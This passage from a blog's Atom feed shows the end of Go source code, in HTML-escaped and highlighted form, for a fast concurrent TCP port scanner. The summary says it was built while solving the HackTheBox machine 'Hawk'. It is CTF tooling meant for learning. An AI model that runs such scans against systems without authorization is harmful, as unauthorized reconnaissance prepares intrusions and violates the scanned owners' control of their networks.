	&lt;span class=&quot;p&quot;&gt;}()&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scanPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Sprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s:%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;// ip:puerto&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DialTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;tcp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Sprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d: %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Sprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d: Abierto&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cancel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WithCancel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Background&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;// Definimos nuestro contexto&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;defer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cancel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[*] Escaneando host %s (Puerto: %s)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;pR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;processRange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scanPorts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;range&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sP&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HasSuffix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;: Abierto&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><category term="Scripting" /><category term="TCP Scan" /><category term="Go Golang" /><summary type="html">En el siguiente artículo os comparto la herramienta `FastTcpScan` que nos desarrollamos en la máquina `Hawk` de la plataforma [HackTheBox](https://hackthebox.eu). Esta herramienta consiste en un escáner que permite detectar de forma rápida y precisa los puertos TCP que una máquina tiene abiertos.</summary></entry></feed>